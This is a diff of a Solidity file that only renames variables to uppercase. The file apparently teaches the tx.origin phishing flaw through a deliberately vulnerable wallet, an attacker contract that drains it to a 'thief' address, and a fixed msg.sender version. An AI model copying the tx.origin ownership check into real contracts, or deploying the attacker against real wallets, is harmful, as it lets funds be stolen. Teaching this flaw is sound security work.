@@ -2,16 +2,16 @@
 pragma solidity ^0.8.24;
 
 contract VulnerableTxOriginWallet {
-    address public immutable owner;
+    address public immutable OWNER;
 
     constructor(address walletOwner) payable {
-        owner = walletOwner;
+        OWNER = walletOwner;
     }
 
     receive() external payable {}
 
     function transferAll(address payable recipient) external {
-        require(tx.origin == owner, "not owner origin");
+        require(tx.origin == OWNER, "not owner origin");
 
         (bool success,) = recipient.call{value: address(this).balance}("");
         require(success, "transfer failed");
@@ -19,30 +19,30 @@ contract VulnerableTxOriginWallet {
 }
 
 contract TxOriginPhishingAttacker {
-    VulnerableTxOriginWallet public immutable target;
-    address payable public immutable thief;
+    VulnerableTxOriginWallet public immutable TARGET;
+    address payable public immutable THIEF;
 
     constructor(address payable targetAddress, address payable thiefAddress) {
-        target = VulnerableTxOriginWallet(targetAddress);
-        thief = thiefAddress;
+        TARGET = VulnerableTxOriginWallet(targetAddress);
+        THIEF = thiefAddress;
     }
 
     function trickOwner() external {
-        target.transferAll(thief);
+        TARGET.transferAll(THIEF);
     }
 }
 
 contract FixedMsgSenderWallet {
-    address public immutable owner;
+    address public immutable OWNER;
 
     constructor(address walletOwner) payable {
-        owner = walletOwner;
+        OWNER = walletOwner;
     }
 
     receive() external payable {}
 
     function transferAll(address payable recipient) external {
-        require(msg.sender == owner, "not owner sender");
+        require(msg.sender == OWNER, "not owner sender");
 
         (bool success,) = recipient.call{value: address(this).balance}("");
         require(success, "transfer failed");
@@ -50,15 +50,15 @@ contract FixedMsgSenderWallet {
 }
 
 contract FailedTxOriginPhishingAttacker {
-    FixedMsgSenderWallet public immutable target;
-    address payable public immutable thief;
+    FixedMsgSenderWallet public immutable TARGET;
+    address payable public immutable THIEF;
 
     constructor(address payable targetAddress, address payable thiefAddress) {
-        target = FixedMsgSenderWallet(targetAddress);
-        thief = thiefAddress;
+        TARGET = FixedMsgSenderWallet(targetAddress);
+        THIEF = thiefAddress;
     }
 
     function trickOwner() external {
-        target.transferAll(thief);
+        TARGET.transferAll(THIEF);
     }
 }
